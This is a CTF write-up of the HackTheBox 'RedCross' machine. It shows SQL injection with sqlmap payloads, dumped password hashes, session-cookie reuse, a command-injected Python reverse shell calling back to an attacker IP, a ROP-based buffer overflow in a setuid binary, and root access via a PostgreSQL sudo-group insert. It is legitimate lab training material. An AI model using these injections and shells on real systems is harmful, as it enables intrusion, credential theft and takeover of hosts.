---
categories:
- CTF
layout: post
media_subpath: /assets/posts/2019-04-13-redcross-hackthebox
tags:
- binary exploitation
- hackthebox
- linux
- sql injection
title: RedCross @ HackTheBox
---

Redcross is a machine on [hackthebox.eu](https://www.hackthebox.eu), featuring sql injection, cookie reuse and a nice binary exploitation challenge, which I enjoyed a lot.

## User Flag

Starting off with nmap we get the following result:

```
22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
| ssh-hostkey:
|   2048 67:d3:85:f8:ee:b8:06:23:59:d7:75:8e:a2:37:d0:a6 (RSA)
|   256 89:b4:65:27:1f:93:72:1a:bc:e3:22:70:90:db:35:96 (ECDSA)
|_  256 66:bd:a1:1c:32:74:32:e2:e6:64:e8:a5:25:1b:4d:67 (ED25519)
80/tcp  open  http     Apache httpd 2.4.25
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Did not follow redirect to https://intra.redcross.htb/
443/tcp open  ssl/http Apache httpd 2.4.25
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Did not follow redirect to https://intra.redcross.htb/
| ssl-cert: Subject: commonName=intra.redcross.htb/organizationName=Red Cross International/stateOrProvinceName=NY/countryName=US
| Not valid before: 2018-06-03T19:46:58
|_Not valid after:  2021-02-27T19:46:58
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
```

First thing that hits the eye is that nmap found a subdomain by looking at the certificate on port 443, so we add it to /etc/hosts and look at the page that presents itself:

![](htb_redcross_web_login.png)

Looking manually at the certificate in the browser we see a potential username penelope@redcross.htb in the issuer field. We try some common passwords for penelope but sadly don’t get a valid login. Instead we eventually find the correct credentials by trying `guest:guest` and log into the application. After playing for a bit we find a sql injection vulnerability in the "o" parameter:

```
https://intra.redcross.htb/?o=1%27&page=app
```

```
DEBUG INFO: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '5' or dest like '1'') LIMIT 10' at line 1
```

To quickly exploit the vulnerability we save a normal reference request to file and use sqlmap:

```
sqlmap -r `pwd`/inject.req --delay 0.5 --level 5 --risk 3 --dbms mysql --batch -p o --proxy=http://127.0.0.1:8080
```

After waiting for a few minutes we see that sqlmap could exploit the injection:

```
Parameter: o (GET)
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: o=1') AND (SELECT 8978 FROM(SELECT COUNT(*),CONCAT(0x7176707671,(SELECT (ELT(8978=8978,1))),0x7171767871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Gnck&page=app

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: o=1') AND SLEEP(5)-- mXWR&page=app
---
```

Among the contents of the database we find some interesting messages:

```
1,You're granted with a low privilege access while we're processing your credentials request. Our messaging system still in beta status. Please report if you find any incidence.,5,1,Guest Account Info
2,"Hi Penny, can you check if is there any problem with the order? I'm not receiving it in our EDI platform.",2,4,Problems with order 02122128
3,"Please could you check the admin webpanel? idk what happens but when I'm checking the messages, alerts popping everywhere!! Maybe a virus?",3,1,Strange behavior
4,"Hi, Please check now... Should be arrived in your systems. Please confirm me. Regards.",4,2,Problems with order 02122128
5,"Hey, my chief contacted me complaining about some problem in the admin webapp. I thought that you reinforced security on it... Alerts everywhere!!",2,3,admin subd webapp problems
6,"Hi, Yes it's strange because we applied some input filtering on the contact form. Let me check it. I'll take care of that since now! KR",3,2,admin subd webapp problems (priority)
7,"Hi, Please stop checking messages from intra platform, it's possible that there is a vuln on your admin side... ",1,2,STOP checking messages from intra (priority)
8,Sorry but I can't do that. It's the only way we have to communicate with partners and we are overloaded. Doesn't look so bad... besides that what colud happen? Don't worry but fix it ASAP.,2,1,STOP checking messages from intra (priority)
```

First of all there is information about an admin webpanel, which we have not found yet. Then there here is a note about "Alerts popping everywhere", which is a hint at a possible Cross-Site Scripting (XSS) vulnerability inside the admin webpanel. In addition to these notes we also get some usernames and password hashes:

```
1,0,admin@redcross.htb,admin,$2y$10$z/d5GiwZuFqjY1jRiKIPzuPXKt0SthLOyU438ajqRBtrb7ZADpwq.
2,1,penelope@redcross.htb,penelope,$2y$10$tY9Y955kyFB37GnW4xrC0.J.FzmkrQhxD..vKCQICvwOEgwf
3,1,charles@redcross.htb,charles,$2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.
4,100,tricia.wanderloo@contoso.com,tricia,$2y$10$Dnv/b2ZBca2O4cp0fsBbjeQ/0HnhvJ7WrC/ZN3K7Q
5,1000,non@available,guest,$2y$10$U16O2Ylt/uFtzlVbDIzJ8us9ts8f9ITWoPAWcUfK585sZue03YBAi
```

We start to crack the hashes and find that after a few minutes only the password of charles (`charles:cookiemonster`) and guest could be recovered. Trying to find the admin webpanel we search for subdirectories and subdomains and finally discover a new subdomain `admin.redcross.htb` which we add to "/etc/hosts" and finally find the admin webpanel:

```
wfuzz --hc 301 -w ~/tools/SecLists/Discovery/DNS/subdomains-top1mil-110000.txt -H "Host: FUZZ.redcross.htb" https://redcross.htb
```

![](htb_redcross_admin_panel.png)

However unfortunately charles credentials don’t work here, they work though on the original site (intra.redcross.htb). We take the cookie from this site after logging in with charles:

```
PHPSESSID=g9e5u1llc1ceb1kh7u4n04r912; LANG=EN_US; SINCE=1552501118; LIMIT=10; DOMAIN=intra
```

And use it on the admin page with cookie manager, resulting in a login:

![](htb_redcross_admin_logged.png)

On "User Management" we can create a new user, which the system creates locally and shows us the credentials : `xct : N9JDyoxU`. We can use the new user to log into the box via ssh! However we seem to be in a restricted shell without much permissions:

```
$ id
uid=2020 gid=1001(associates) groups=1001(associates)
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
penelope:x:1000:1000:Penelope,,,:/home/penelope:/bin/bash
```

To escape the shell restrictions we use vim `:!/bin/bash`. Enumerating the box doesn’t yield too much interesting stuff though, so we go back to the webapp to explore the second "app". On "Firewall" we can add an ip address to a whitelist. After some manual tries we find that the ip parameter is injectable `ip=10.10.14.5; whoami&id=23&action=deny`. We use a python reverse shell oneliner and get a shell back as www-data:

```
ip=10.10.14.14; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'&id=23&action=deny
```

We upgrade the shell `python -c 'import pty; pty.spawn("/bin/bash")'` and find the user flag in "/home/penelope/" but can’t read it as its only readable by root and penelope. At this point I continued to root the machine and ignored the user flag.

## Root Flag

There are (at least) 2 ways to root this box, one via binary exploitation and one via group shenanigans, which I will show both.

We start with the binary exploitation method by looking for suid binaries with `find / -perm -u=s -type f 2>/dev/null` and find an unusual binary: "/opt/iptctl/iptctl". Since custom suid binaries on ctfs hint at exploitation exercises we download the binary to our box for analysis. In addition we check what security measures we would have to deal with if we can exploit the binary. First we check for ASLR with `cat /proc/sys/kernel/randomize_va_space` which gives back the value "2". This means we have full aslr enabled. We open the binary in gdb with [gef](https://gef.readthedocs.io/en/master/) and run `checksec` to look for more security measures:

```
[+] checksec for '/home/xct/htb/RedCross/iptctl'
Canary                        : No
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                         : Partial
```

This means that we have to bypass ASLR and NX to exploit this binary. Some further enumeration on the box gets us the source code of binary ("/var/jail/home/public/src/iptctl.c"), which speeds the process of understanding the binary up a lot. A comment at the top of the source says that the interactive mode is still tested so we have a look at the interactive function:

```cpp
void interactive(char *ip, char *action, char *name){
  char inputAddress[16];
  char inputAction[10];
  printf("Entering interactive mode\n");
  printf("Action(allow|restrict|show): ");
  fgets(inputAction,BUFFSIZE,stdin); // this reads at most 360 and actually smashes the stack
  fflush(stdin);
  printf("IP address: ");
  fgets(inputAddress,BUFFSIZE,stdin); // this reads at most 360
  fflush(stdin);
  inputAddress[strlen(inputAddress)-1] = 0;
  if(! isValidAction(inputAction) || ! isValidIpAddress(inputAddress)){
    printf("Usage: %s allow|restrict|show IP\n", name);
    exit(0);
  }
  strcpy(ip, inputAddress);
  strcpy(action, inputAction);
  return;
}
```

We can see several problems with this. First of all "fgets" is being used to read from stdin into the 2 buffers "inputAddress" and "inputAction", with a maximum input of up to "BUFFSIZE" (360). This is a classic buffer overflow, however there is a twist, being that in order to take control of rip we need to reach the return statement at the end of the function, which is "guarded" by 2 checks "isValidAction" and "isValidIpAddress". If we fail any of these checks the function will call exit and we will not reach the return statement.

The first check function we look at is "isValidIpAddress":

```
int isValidIpAddress(char *ipAddress)
{
      struct sockaddr_in sa;
      int result = inet_pton(AF_INET, ipAddress, &(sa.sin_addr));
  return result != 0;
}
```

The input that is read from stdin is directly put into the "inet\_pton" function, which converts ip addresses between formats, leading to failure if it can’t do so. I don’t think this is something where we could enter anything else but a valid ip, so lets look at the other function:

```cpp
int isValidAction(char *action)
{
  int a=0;
  char value[10];
  strncpy(value,action,9);
  if(strstr(value,"allow")) a=1;
  if(strstr(value,"restrict")) a=2;
  if(strstr(value,"show")) a=3;
  return a;
}
```

Here we can see that only the first 9 characters of action are copied into a local variable. Then "strstr" is being used to compare the action to some predefined strings. When using "strstr" only up to n (n = length of predfined string) characters are compared. This means that we can enter something like `showAAAA` and the check is still passed!

A simple poc that shows that we can overwrite the instruction pointer looks like this:

```
run -i <<<$(python -c 'print "show"+"A"*100+"\n127.0.0.1\n"')
```

```
...
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"     ← $rsp
─────────────────────────────── code:x86:64 ────
     0x400b57 <interactive+264> call   0x4006f0 <strcpy@plt>
     0x400b5c <interactive+269> nop
     0x400b5d <interactive+270> leave
 →   0x400b5e <interactive+271> ret
[!] Cannot disassemble from $PC
```

Next we need the offset of the instruction pointer overwrite so we can replace it with a chosen value:

```
gef➤  pattern create  100
[+] Generating a pattern of 100 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa

run -i <<<$(python -c 'print "show"+"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa"+"\n127.0.0.1\n"')

x/8xg $rsp    
0x6161616161656161    
[+] Found at offset 30 (little-endian search) likely
```

So the new poc looks like this:

```
run -i <<<$(python -c 'print "show"+"A"*30+"B"*8+"\n127.0.0.1\n"')
```

Since aslr and nx are active we decide to use a rop chain to get code execution. Using [ropper](https://scoding.de/ropper/) `ropper --file iptctl` we find some interesting gadgets:

```
...
0x0000000000000de3: pop rdi; ret;
0x0000000000000de1: pop rsi; pop r15; ret;
...
```

These are especially interesting because the binary is x64 and arguments to functions are given via registers rdi and rsi. Since the binary is not position independent (no PIE) it will be loaded to a static address every time it is executed – aslr is only affecting libraries loaded. A very valuable target for jumping around in the binary is the procedure linkage table (plt), which is basically a jump table that is required for dynamic linking. Every entry is a jump referencing an address in got.plt, a table of offsets, where the linker enters addresses of dynamic resolved functions on their first use.

The most interesting functions we can jump to are:

```
execvp = 0x400760
setuid = 0x400780
```

The plan for exploiting the binary is now to create a rop chain that calls setuid with the argument 0, followed by a call to execvp with the argument "/bin/sh" to get a shell. The problem that remains is that we do not have any "/bin/sh" string in the binary. We can not use the ones from libc because with aslr we don’t know its address. We find however that we have a string in the binary called "fflush", which is just perfect as it ends in "sh", followed by a null byte!

With all these steps we can finally write the full [exploit](https://gist.github.com/xct/c5e7a4daad34af690bdbb42b3f6b2941), leading to a shell on our attacker box.

To finally root the box we cant just run the exploit script on the target because it probably won’t have pwntools on it. What we can do though is using socat to make the binary available via network and exploit it remotely. In order to do this we have to whitelist our ip address in the web application on the "Firewall" menu and run the following command:

```
socat TCP-LISTEN:1701,reuseaddr,fork EXEC:"/opt/iptctl/iptctl -i" &
```

Then we run the exploit and become root.

The other (easy) method to obtain root, is to create a user in the sudoers group via the postgresql database. This works because the "passwd\_table" is mapped to the users of the system and the sudoers file allows everyone with gid 27 to become root (`%sudo ALL=(ALL:ALL) ALL`).

```
psql -U unixusrmgr -h 127.0.0.1 -d unix //dheu%7wjx8B&
insert into passwd_table (username, passwd, gid, homedir) values ('gold', '$1$D0BywwXu$afgdHC5cWNw1bdlyls6TH.', 27, '/home/gold');
```

Logging in as "gold" and issuing `sudo -i` lets us become root and read the flag.

Many thanks to [ompamo](https://twitter.com/ompamo) for this amazing box!